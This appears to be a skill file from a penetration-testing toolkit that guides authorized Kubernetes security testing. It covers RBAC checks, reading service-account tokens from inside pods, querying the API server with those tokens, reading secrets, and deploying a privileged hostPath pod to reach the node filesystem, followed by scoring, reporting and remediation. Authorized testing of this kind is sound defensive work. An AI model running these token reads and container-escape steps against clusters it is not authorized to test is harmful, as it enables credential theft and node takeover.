---
name: kubernetes
description: 'Kubernetes security testing for RBAC over-grant, exposed API server, secret access, and container escape paths. Triggers: Kubernetes, k8s, RBAC, "pod escape", "k8s စစ်", kubectl.'
category: platform
track: 03-platform
tags: [kubernetes, rbac, container, escape, secrets]
severity_ceiling: critical
requires: [baseline-http-capture]
tools: [kubectl, curl, trivy, nuclei]
cwe: CWE-284
owasp: []
version: 1.0.0
author: kkuser
source: original
---

> Shared rules apply: `../_shared/evidence-policy.md`, `../_shared/scope-gate.md`.

# Kubernetes Security Testing

## 1. Preconditions

- Authorization naming the cluster, namespaces, and whether node-level access is permitted.
- A credential with limited rights — ideally a pod's service-account token, so the test reflects
  a realistic compromise.
- Read-only default. Creating pods, `kubectl exec` on non-test workloads, and node access need
  per-action approval.

## 2. Gate

```bash
kubectl auth can-i --list
kubectl auth whoami 2>/dev/null || kubectl config view --minify -o jsonpath='{.contexts[0].context.namespace}{"\n"}'
```

**Pass (finding):** the identity can read secrets, create pods, or escalate beyond its
namespace, proven by one read-only call. **Fail:** all `can-i` answers are `no` and reads 403.

## 3. Enumeration

```bash
# from inside a pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# with a token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces

# what am I allowed to do
kubectl auth can-i --list --namespace "$NS"
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.name=="system:serviceaccount:'"$NS"':default") | .roleRef.name'
```

High-value checks: `get/list secrets` cluster-wide, `create pods` (privileged/mount hostPath),
`create clusterrolebinding`, `impersonate`, `escalate`, `bind`, exposed API server with
anonymous auth, `kubelet` 10250 anonymous, dashboards, default SA with cluster-admin,
`automountServiceAccountToken` on pods that do not need it.

## 4. Test Matrix

| # | Class | Check | Pass |
|---|---|---|---|
| 1 | Secret read | `get secrets -n kube-system` | data |
| 2 | Pod create | create privileged pod | running |
| 3 | RBAC escalate | `create clusterrolebinding` | allowed |
| 4 | Anonymous API | `curl :6443/api` no token | 200 |
| 5 | Kubelet | `:10250/pods` no auth | pod list |
| 6 | HostPath mount | pod spec | host FS visible |
| 7 | Token automount | pod spec | token present |
| 8 | Image | trivy | critical CVEs |

## 5. Proof

```bash
# 1. secrets — read one key only, redact the value
kubectl get secret -n "$NS" -o json | jq -r '.items[0].metadata.name'
kubectl get secret "$(kubectl get secret -n "$NS" -o jsonpath='{.items[0].metadata.name}')" \
  -n "$NS" -o jsonpath='{.data}' | head -c 80; echo " <redacted>"

# 2. privileged pod to prove node access (needs approval)
cat <<'YAML' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: {name: kkuser-proof, namespace: default}
spec:
  hostPID: true
  containers:
  - name: c
    image: alpine
    command: ["sh","-c","echo PROOF; ls /host | head; sleep 30"]
    securityContext: {privileged: true}
    volumeMounts: [{name: h, mountPath: /host}]
  volumes: [{name: h, hostPath: {path: /}}]
YAML
kubectl logs kkuser-proof
kubectl delete pod kkuser-proof

# 3. anonymous API server
curl -sk https://API:6443/api/v1/namespaces | head -20
```

Always delete created workloads. Leave no pod, binding, or file behind.

## 6. Counterevidence

| Alternative explanation | How to kill it |
|---|---|
| The secret is a placeholder | Check length/decodability and whether it authenticates |
| `can-i` says yes but admission policy denies | Attempt the read and confirm |
| The pod can create pods but only in its own namespace with a restricted PSA | Check the namespace's Pod Security admission level |
| Kubelet is exposed but requires client certs | A 401 is not a finding |
| The token is short-lived and bound to a specific audience | Check `exp` and `aud` |
| You are in a managed control plane that blocks node access | Say the boundary you could not cross |

## 7. Impact

Tiered: secret read in one namespace, cluster-wide secret read, node access via privileged pod
(container escape), or cluster-admin via RBAC. State the scope you reached.

## 8. CVSS 3.1

```text
SA token → cluster-admin:            CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 8.8
Namespace secret read:               CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 5.5
Privileged pod → node filesystem:    CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H = 8.8
Anonymous API server:                CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
```

`AV:L` is honest for token-based paths: the attacker already has code execution in a pod.

## 9. Report

```markdown
# Default service account can read secrets in all namespaces

**Severity:** Medium (CVSS 3.1: 5.5 — AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
**Affected asset:** namespace `payments` SA `default` → cluster-wide secrets
**Category:** CWE-284 · Kubernetes RBAC misconfiguration
```

## 10. Remediation

- Replace `default` SA bindings; give each workload its own SA with the narrowest Role.
- Never grant `get/list/watch secrets` cluster-wide; use a secret manager with per-workload auth.
- Set `automountServiceAccountToken: false` unless needed.
- Enforce Pod Security `restricted`; deny privileged, hostPath, hostPID/hostNetwork.
- Require `--anonymous-auth=false` on the API server; bind kubelet to internal only.
- Audit `create pods`, `create rolebindings`, `exec`, and secret reads.
- Scan images with `trivy image` in CI.

Regression test: `kubectl auth can-i get secrets --all-namespaces --as=system:serviceaccount:x:default`
must be `no`.

## 11. References

- Kubernetes — RBAC Good Practices; Pod Security Standards
- NSA/CISA — Kubernetes Hardening Guide
- CWE-284: Improper Access Control
